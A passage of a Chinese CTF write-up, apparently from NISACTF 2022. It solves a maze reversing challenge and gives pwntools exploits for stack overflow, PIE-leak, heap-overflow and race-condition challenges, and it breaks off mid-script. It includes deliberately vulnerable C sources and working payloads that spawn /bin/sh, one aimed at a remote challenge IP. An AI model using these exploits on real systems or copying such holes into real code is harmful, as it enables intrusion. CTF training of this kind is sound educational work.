+<p>(遗憾版本)v3:本来还想整个upx变形壳，但是给ctfd搞的没空了(难过)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281510266.png" alt="img"></p>
+<p>main函数开局retn 10086，这不可能的噢，一般都是先push rbp，开栈嘛</p>
+<p>还是动调改一下，或者ida patch 不过要知道机器码就是了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281511069.png" alt="img"></p>
+<p>Dfs函数一样的问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281511900.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281511874.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281511378.png" alt="img"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits/stdc++.h&gt;</span><br><span class="line">​</span><br><span class="line">using namespace std;</span><br><span class="line">​</span><br><span class="line">const int RATE_KEEP_DIR=000;</span><br><span class="line">const int TWIST_RATE=10;</span><br><span class="line">const int RETURN_RATE=100;</span><br><span class="line">​</span><br><span class="line">int n,m,Sx,Sy,Tx,Ty,Max;</span><br><span class="line">char    Map[1100][1100];</span><br><span class="line">typedef pair&lt;int,int&gt;   PII;</span><br><span class="line">const int dx[4]=&#123;-1,0,1,0&#125;,dy[4]=&#123;0,1,0,-1&#125;;</span><br><span class="line">const int Dx[4]=&#123;-2,0,2,0&#125;,Dy[4]=&#123;0,2,0,-2&#125;;</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">bool    Check(const int x,const int y)</span><br><span class="line">&#123;</span><br><span class="line">    for(int i=0;i&lt;4;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        int nx=x+dx[i],ny=y+dy[i],Nx=x+Dx[i],Ny=y+Dy[i];</span><br><span class="line">        if(Nx&gt;=0 &amp;&amp; Nx&lt;n &amp;&amp; Ny&gt;=0 &amp;&amp; Ny&lt;m &amp;&amp; (Map[Nx][Ny]==&#x27;1&#x27; &amp;&amp; Map[nx][ny]==&#x27;1&#x27;))return true;</span><br><span class="line">    &#125; return false;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">void    Dfs(const int x,const int y,const int depth,int Lim,const int last_dir)</span><br><span class="line">&#123;</span><br><span class="line">    if(depth&gt;Max)Tx=x,Ty=y,Max=depth;</span><br><span class="line">    if(depth&gt;Lim) return ;</span><br><span class="line">    Map[x][y]=&#x27;0&#x27;;</span><br><span class="line">    while(Check(x,y))</span><br><span class="line">    &#123;</span><br><span class="line">        int t=rand()%4;</span><br><span class="line">        if(rand()%1000&lt;RATE_KEEP_DIR) t=last_dir;</span><br><span class="line">        int nx=x+dx[t],ny=y+dy[t],Nx=x+Dx[t],Ny=y+Dy[t];</span><br><span class="line">        if(nx&lt;0 || nx&gt;n-1 || ny&lt;0 || ny&gt;m-1 || Map[nx][ny]!=&#x27;1&#x27;)continue;</span><br><span class="line">        if(Nx&lt;0 || Nx&gt;n-1 || Ny&lt;0 || Ny&gt;m-1 || Map[Nx][Ny]!=&#x27;1&#x27;)continue;</span><br><span class="line">        if(Nx==0 || Nx==n-1 || Ny==0 || Ny==m-1) &#123; Map[nx][ny]=&#x27;0&#x27;; continue; &#125;</span><br><span class="line">        Map[nx][ny]=&#x27;0&#x27;; Map[Nx][Ny]=&#x27;0&#x27;;</span><br><span class="line">        Dfs(Nx,Ny,depth+1,Lim,t);</span><br><span class="line">        if((int)(rand()%1000)&lt;(min(n,m)&lt;100?0:RETURN_RATE)) return ;</span><br><span class="line">​</span><br><span class="line">        Lim=depth+max(min(n,m)/TWIST_RATE,5);</span><br><span class="line">    &#125;</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n=31,m=31;</span><br><span class="line">    for(int i=0;i&lt;n;++i) for(int j=0;j&lt;m;++j) Map[i][j]=&#x27;1&#x27;;</span><br><span class="line">    Sx=Sy=1;</span><br><span class="line">    Dfs(Sx,Sy,0,max(min(n,m)/TWIST_RATE,5),2);</span><br><span class="line">    Map[Sx][Sy]=&#x27;S&#x27;;</span><br><span class="line">    Map[Tx][Ty]=&#x27;T&#x27;;</span><br><span class="line">    printf(&quot;OHHH,the MAZE is been create!\n&quot;);</span><br><span class="line">    printf(&quot;but,sorry!,you cann&#x27;t&#x27; watch this MAZE\n&quot;);</span><br><span class="line">    printf(&quot;you need to &#x27;re&#x27; the program and draw the MAZE\n&quot;);</span><br><span class="line">    printf(&quot;give you a infomation of the maze required 197 steps!\n&quot;);</span><br><span class="line">    printf(&quot;You need input &#x27;wasd&#x27; to move from S to T\n&quot;);</span><br><span class="line">    printf(&quot;w is up,s is down,a is left,d is right\n&quot;);</span><br><span class="line">    printf(&quot;If you are correct!\n&quot;);</span><br><span class="line">    printf(&quot;NSSCTF&#123;md5(your input)&#125;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逆向出来，然后自己加print打印出迷宫</p>
+<p>一个31x31的迷宫</p>
+<p>终点在[18,23]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">31 31</span><br><span class="line">18 23</span><br><span class="line">map=[[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1],[1,0,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1],[1,1,1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,1,1,0,1,1,1,1,1,0,1],[1,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,1],[1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,0,1,1,1,1,1,0,1,1,1,0,1,1,1,1,1],[1,0,0,0,1,0,1,0,0,0,1,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,0,0,0,0,1],[1,0,1,1,1,0,1,1,1,0,1,1,1,0,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,0,1],[1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,1],[1,0,1,1,1,1,1,1,1,1,1,0,1,0,1,1,1,0,1,1,1,1,1,0,1,0,1,1,1,0,1],[1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,0,0,1],[1,1,1,0,1,1,1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,0,1,0,1,1,1,0,1],[1,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,1],[1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,0,1],[1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,1,0,0,0,0,0,0,0,0,0,1],[1,0,1,1,1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,1,1,0,1,1,1,1,1,1,1],[1,0,1,0,0,0,1,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1],[1,0,1,1,1,0,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,1,1,1,1,1,1,0,1],[1,0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1],[1,0,1,0,1,0,1,0,1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,0,1,0,1],[1,0,0,0,1,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1],[1,0,1,1,1,1,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,0,1,1,1,1,1,0,1,0,1],[1,0,1,0,0,0,1,0,1,0,1,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,1],[1,0,1,0,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,0,1,0,1,1,1,1,1,0,1],[1,0,0,0,1,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,1,0,0,0,1,0,1,0,1],[1,1,1,0,1,0,1,1,1,1,1,0,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,0,1,0,1],[1,0,1,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,1],[1,0,1,0,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,0,1],[1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1],[1,1,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,1,1,0,1,0,1,0,1,1,1,1,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1],[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]]</span><br><span class="line">1111111111111111111111111111111</span><br><span class="line">1S00100010000010000000000000001</span><br><span class="line">1110111010101111101111101111101</span><br><span class="line">1010001000100000100000100000101</span><br><span class="line">1011101011101110111110111011111</span><br><span class="line">1000101000101010000010101000001</span><br><span class="line">1011101110111011101110101110101</span><br><span class="line">1000000010001010001000001010101</span><br><span class="line">1011111111101011101111101011101</span><br><span class="line">1000100000000010100000101010001</span><br><span class="line">1110111011101010111110101011101</span><br><span class="line">1000001000101000000010000000101</span><br><span class="line">1111101111111111111011111111101</span><br><span class="line">1010000000000010101010000000001</span><br><span class="line">1011111111101010101011101111111</span><br><span class="line">1010001000101010001000100000001</span><br><span class="line">1011101110111010111011111111101</span><br><span class="line">10100010000010101000001T1000001</span><br><span class="line">1010101010111010101111101110101</span><br><span class="line">1000100010001010000010000010101</span><br><span class="line">1011111110101011111010111110101</span><br><span class="line">1010001010101000101000100000101</span><br><span class="line">1010111011101011101110101111101</span><br><span class="line">1000100000001010000010100010101</span><br><span class="line">1110101111101011101011101110101</span><br><span class="line">1010100000101000001000001010001</span><br><span class="line">1010111110111111111111111010101</span><br><span class="line">1000000010000010000000001000101</span><br><span class="line">1111101110101110111110101011111</span><br><span class="line">1000001000100000001000100000001</span><br><span class="line">1111111111111111111111111111111</span><br></pre></td></tr></table></figure>
+
+<p>然后再找一个/自己写一个Dfs算法去解密迷宫就好了。</p>
+<p>emmmm。太难了 眼看197步，要瞎了</p>
+<p>脚本来自VNCTF2022 babyMaze，建议收藏</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">map=[[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1],[1,0,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1],[1,1,1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,1,1,0,1,1,1,1,1,0,1],[1,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,1],[1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,0,1,1,1,1,1,0,1,1,1,0,1,1,1,1,1],[1,0,0,0,1,0,1,0,0,0,1,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,0,0,0,0,1],[1,0,1,1,1,0,1,1,1,0,1,1,1,0,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,0,1],[1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,1],[1,0,1,1,1,1,1,1,1,1,1,0,1,0,1,1,1,0,1,1,1,1,1,0,1,0,1,1,1,0,1],[1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,0,0,1],[1,1,1,0,1,1,1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,0,1,0,1,1,1,0,1],[1,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,1],[1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,0,1],[1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,1,0,0,0,0,0,0,0,0,0,1],[1,0,1,1,1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,1,1,0,1,1,1,1,1,1,1],[1,0,1,0,0,0,1,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1],[1,0,1,1,1,0,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,1,1,1,1,1,1,0,1],[1,0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1],[1,0,1,0,1,0,1,0,1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,0,1,0,1],[1,0,0,0,1,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1],[1,0,1,1,1,1,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,0,1,1,1,1,1,0,1,0,1],[1,0,1,0,0,0,1,0,1,0,1,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,1],[1,0,1,0,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,0,1,0,1,1,1,1,1,0,1],[1,0,0,0,1,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,1,0,0,0,1,0,1,0,1],[1,1,1,0,1,0,1,1,1,1,1,0,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,0,1,0,1],[1,0,1,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,1],[1,0,1,0,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,0,1],[1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1],[1,1,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,1,1,0,1,0,1,0,1,1,1,1,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1],[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]]</span><br><span class="line">usedmap = [[0 for i in range(len(map))] for i in range(len(map)) ]</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">def DFS(x, y):</span><br><span class="line">    global flag</span><br><span class="line">    if x == 18 and y == 23:</span><br><span class="line">        print(flag)</span><br><span class="line">        print(len(flag))</span><br><span class="line">        print(&quot;MD5:&quot;,hashlib.md5(flag.encode()).hexdigest())</span><br><span class="line">        return</span><br><span class="line"> </span><br><span class="line">    if map[x + 1][y] == 0 and usedmap[x + 1][y] == 0: # 如果下⼀步不是墙 且没⾛过</span><br><span class="line">        usedmap[x][y] = 1 # 标记当前坐标⾛过（不是下⼀步）</span><br><span class="line">        flag += &#x27;s&#x27;</span><br><span class="line">        DFS(x + 1, y) # 尝试向下⾛</span><br><span class="line">        flag = flag[:-1] # 回溯到这说明这条路不可⾏ 所以去掉&#x27;s&#x27;</span><br><span class="line">        usedmap[x][y] = 0 # 再设置当前坐标为0 重新找路</span><br><span class="line">    if map[x - 1][y] == 0 and usedmap[x - 1][y] == 0:</span><br><span class="line">        usedmap[x][y] = 1</span><br><span class="line">        flag += &#x27;w&#x27;</span><br><span class="line">        DFS(x - 1, y)</span><br><span class="line">        flag = flag[:-1]</span><br><span class="line">        usedmap[x][y] = 0</span><br><span class="line">    if map[x][y + 1] == 0 and usedmap[x][y + 1] == 0:</span><br><span class="line">        usedmap[x][y] = 1</span><br><span class="line">        flag += &#x27;d&#x27;</span><br><span class="line">        DFS(x, y + 1)</span><br><span class="line">        flag = flag[:-1]</span><br><span class="line">        usedmap[x][y] = 0</span><br><span class="line">    if map[x][y - 1] == 0 and usedmap[x][y - 1] == 0:</span><br><span class="line">        usedmap[x][y] = 1</span><br><span class="line">        flag += &#x27;a&#x27;</span><br><span class="line">        DFS(x, y - 1)</span><br><span class="line">        flag = flag[:-1]</span><br><span class="line">        usedmap[x][y] = 0</span><br><span class="line">print(&quot;path:&quot;)</span><br><span class="line">x = 1 # 设置起始坐标</span><br><span class="line">y = 1</span><br><span class="line">DFS(x, y)</span><br><span class="line">path:</span><br><span class="line">ddssddssssaaaassddssddssddddddddssssssssssssddddwwddssddddwwwwddddwwwwddwwaaaaaawwddddddwwwwwwwwaaaawwaawwaaaaaassddddssssddssssaawwaaaawwwwaawwaaaawwaassaassddssddssddssddddddssssssaassddssddwwddw</span><br><span class="line">197</span><br><span class="line">MD5: 1fcb6cfc5995f7362a8106dd42cdfe20</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="鸣神的国土"><a href="#鸣神的国土" class="headerlink" title="鸣神的国土"></a>鸣神的国土</h3><p>程序是一个.s文件</p>
+<p>使用<code>as re -o giao</code>     <code>gcc giao -o giaogiao</code>进行编译</p>
+<p>ROT13然后base64</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281513703.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281513381.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281513940.png" alt="img"></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(&quot;124.71.97.27&quot;,10000)</span><br><span class="line">io.recvuntil(&quot;Welcome to NISACTF\n&quot;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x48+4)+p32(0x08048390)+p32(0)+p32(0x0804A024)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="ezpie"><a href="#ezpie" class="headerlink" title="ezpie"></a>ezpie</h3><p>如题，开了pie保护，地址随机化，32位程序，8位地址，给了3位。</p>
+<p>main函数中的</p>
+<p>printf(“%p\n”,main);给了main函数地址</p>
+<p>这边能直接显示地址是做了一次定义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int (*entry_t)(int argc, char *argv[]);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    entry_t addr = main;</span><br><span class="line">    puts(&quot;OHHH!,give you a gift!&quot;);</span><br><span class="line">    printf(&quot;%p\n&quot;,addr);</span><br><span class="line">    puts(&quot;Input:&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void vuln()&#123;</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x50);</span><br><span class="line">&#125;</span><br><span class="line">void shell()&#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>源码在这边，可以参考一下。反正就是给了一个完整的text段的函数地址</p>
+<p>那么就知道了前5位的函数地址。主要就是接收数据的问题了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./pie&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;gift!\n&quot;)</span><br><span class="line">base_addr = int(io.recvuntil(&quot;6d0&quot;),16)</span><br><span class="line">log.info(&quot;base_addr:&quot;+hex(base_addr))</span><br><span class="line">shell_addr = base_addr + 0x79</span><br><span class="line">log.info(&quot;shell_addr:&quot;+hex(shell_addr))</span><br><span class="line">io.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x28+4)+p32(shell_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>接收数据到6d0也就是main函数的地址，这样就可以获得base_addr。然后main()跟shell()的offset 很容易算的  就0x79 。然后就是一个栈溢出了。</p>
+<h3 id="ReorPwn"><a href="#ReorPwn" class="headerlink" title="ReorPwn"></a>ReorPwn</h3><p>发现进去之后，有一个倒着写的什么巴拉巴拉的东西。然后提示系统调用符输入hs就行了</p>
+<h3 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h3><p>很简单的一个堆溢出 首先要知道堆的基本结构，chunk 我开了2个chunk，并且申请连续的heap空间。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt; </span><br><span class="line">#include&lt;stdlib.h&gt; </span><br><span class="line">#include&lt;string.h&gt; </span><br><span class="line">int main() &#123; </span><br><span class="line">char *chunk1,*chunk2; </span><br><span class="line">chunk1 = malloc(0x16); chunk2 = malloc(0x16); </span><br><span class="line">puts(&quot;Input:&quot;); </span><br><span class="line">gets(chunk1); </span><br><span class="line">system(chunk2); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有一个gets函数对chunk1生效。并且system的参数为chunk2 那么就说明我们可以通过去覆盖chunk1，然后溢出到chunk2 。</p>
+<p>只需要会gdb调试看参数就行。 由于不确定参数位置(如果没有什么经验的话) 我们就先写16个a进chunk1 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281516848.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281516373.png" alt="img"></p>
+<p>可以看到在0x96551a0 - 0x96551c0 位置 其中system参数command调用的是0x96551c0 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281516407.png" alt="img"></p>
+<p>那这边如果熟练就可以直接看出来，往前走5个字节就能到0x96551c0。如果不熟练可以+1+1的慢慢调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">io = process(&quot;./heap&quot;) </span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Input:\n&quot;); </span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x16+5)+b&#x27;/bin/sh&#x27; </span><br><span class="line"></span><br><span class="line">gdb.attach(io) </span><br><span class="line"></span><br><span class="line">io.sendline(payload) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281517668.png" alt="img"></p>
+<p>这样command参数就正确了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281517053.png" alt="img"></p>
+<h3 id="shop-pwn"><a href="#shop-pwn" class="headerlink" title="shop_pwn"></a>shop_pwn</h3><p>主要是通过竞争刷钱的方式来获取flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281518309.png" alt="img"></p>
+<p>买时通过建立一个线程 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281522312.png" alt="img"></p>
+<p>漏洞出在卖这个函数通过线程之间的冲突，先买一个，然后在卖的哪个线程结束之前再卖第二遍。 要做到快，要快点在线程结束前再卖，如果接收 &gt; 的话本地打的通但是远程不行，感觉是网络延迟的问 题？ </p>
+<p>所以最后就换成了接收 \n 来接收数据(sendline) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"> </span><br><span class="line">io = process(&quot;./shop&quot;) </span><br><span class="line">io.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;) </span><br><span class="line">io.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;) </span><br><span class="line">io.recvuntil(&quot;\n&quot;) </span><br><span 